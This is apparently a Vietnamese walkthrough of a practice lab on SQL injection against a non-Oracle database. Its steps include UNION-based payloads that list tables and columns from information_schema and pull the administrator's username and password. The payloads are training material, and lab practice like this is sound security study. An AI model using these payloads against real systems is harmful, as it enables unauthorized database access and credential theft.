# SQL Injection Lab 05: List Database Contents (Non-Oracle)

## Mục tiêu
Liệt kê bảng, cột và lấy mật khẩu tài khoản `administrator` trên hệ quản trị non-Oracle.

## Đề bài
<img src="images/05_list-db-non-oracle-2026-04-14-20-58-45.png" alt="Lab overview" width="760" />
<br><br>

## Bước 1: Bắt request trong Burp Repeater
<img src="images/05_list-db-non-oracle-2026-04-14-21-00-06.png" alt="Captured request" width="760" />
<br><br>

## Bước 2: Dò số cột và cột hiển thị text
<img src="images/05_list-db-non-oracle-2026-04-14-21-02-36.png" alt="Column probing" width="760" />
<br><br>

## Bước 3: Liệt kê tên bảng

```sql
' union select table_name, null from information_schema.tables --
```

<img src="images/05_list-db-non-oracle-2026-04-14-21-06-03.png" alt="Liệt kê bảng" width="760" />
<br><br>

## Bước 4: Xác định bảng người dùng
Xác định được bảng: `users_bcqzsz`.

<img src="images/05_list-db-non-oracle-2026-04-14-21-09-46.png" alt="Bảng users" width="760" />
<br><br>

## Bước 5: Liệt kê cột của bảng users

```sql
' union select column_name, null from information_schema.columns where table_name = 'users_bcqzsz' --
```

<img src="images/05_list-db-non-oracle-2026-04-14-21-13-08.png" alt="Liệt kê cột" width="760" />
<br><br>

## Bước 6: Lấy tài khoản administrator

```sql
' union select username_ellhtp, password_hlxblr from users_bcqzsz where username_ellhtp = 'administrator' --
```

<img src="images/05_list-db-non-oracle-2026-04-14-21-18-01.png" alt="Thông tin admin" width="760" />
<br><br>

## Payload solve

```sql
' union select username_ellhtp, password_hlxblr from users_bcqzsz where username_ellhtp = 'administrator' --
```

## Kết quả
Lấy được username/password của `administrator` và đăng nhập thành công.
